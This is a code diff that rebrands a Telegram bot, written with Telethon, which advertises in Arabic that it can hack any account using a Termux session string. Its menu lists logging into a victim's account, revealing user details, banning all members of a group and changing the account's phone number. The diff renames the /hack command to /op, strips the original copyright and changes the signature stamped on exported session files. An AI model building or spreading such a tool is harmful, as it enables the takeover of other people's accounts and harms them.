@@ -1,5 +1,4 @@
-# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
-# NOW PUBLIC BY LEGENDX
+
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -159,7 +158,7 @@ B: [** اضهار معلومات المستخدم مثل :الرقم، الاس�
 
 C: [** حظر جميع اعضاء قروب معين "" عطيني كود تيرمكس واسم لقروب "" **]
 
-D: [** تسجيل دخول لحساب الضحية "" الخطوة الاولة اختر B وبعدها انسخ رقم الهاتف وستعمل هاذي الميزه "" **]
+D: [** تسجيل الدخول الى حساب الضحية **]
 
 E: [** دخول لقنـاة بواسطة كود تيرمكس** ]
 
@@ -182,15 +181,17 @@ M: [** تغيير رقم الهاتف باستعمال كود تيرمكس **]
 ** مميزات اكثر لاحقاً **
 '''
 mm = '''
+**
 مرحباً، 
 يمكنك اختراق اي حساب بواسطة كود تيرمكس! 
-للمميزات ارسل : /hack
+للمميزات ارسل : /op
+**
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("الرجاء استعمالي في الليل ")
+    await event.reply("**الرجاء استعمالي في الليل **")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
@@ -204,10 +205,10 @@ async def op(event):
       pass
 
 
-@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
+@client.on(events.NewMessage(pattern="/op", func=lambda x: x.is_group))
 async def op(event):
   await event.reply("please use me in pm🥺")
-@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
+@client.on(events.NewMessage(pattern="/op", func = lambda x: x.is_private))
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
@@ -228,7 +229,7 @@ async def start(event):
         return await event.reply("كود تيرمكس هذا تم الغاء تفعيلة")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY TRAKOS")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -391,7 +392,7 @@ async def start(event):
         await event.respond("**اذا واجهتك اي مشكله أرسلها هنا : @ttrakos**" + str(e))
 
     else:
-      await event.respond("**لم يتم العثور على الامر! الرجاء ارسال : /hack والمحاولة فيما بعد")
+      await event.respond("**لم يتم العثور على الامر! الرجاء ارسال : /op والمحاولة فيما بعد**")
 
 
 
